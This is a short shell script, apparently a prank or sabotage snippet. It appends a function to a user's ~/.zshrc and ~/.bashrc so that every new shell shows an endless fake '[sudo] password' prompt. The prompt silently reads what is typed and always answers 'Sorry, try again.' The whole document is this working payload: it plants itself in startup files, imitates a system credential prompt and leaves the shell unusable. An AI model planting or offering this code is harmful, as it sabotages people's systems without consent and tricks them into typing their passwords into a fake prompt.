echo 'ask() {
    while ((1 == 1)); do
        echo -e "[sudo] password for $LOGNAME: \c"
        read -s password
        echo ""
        sleep 2
        echo "Sorry, try again."
    done
}
ask' >> ~/.zshrc

echo 'ask() {
    while ((1 == 1)); do
        echo -e "[sudo] password for $LOGNAME: \c"
        read -s password
        echo ""
        sleep 2
        echo "Sorry, try again."
    done
}
ask' >> ~/.bashrc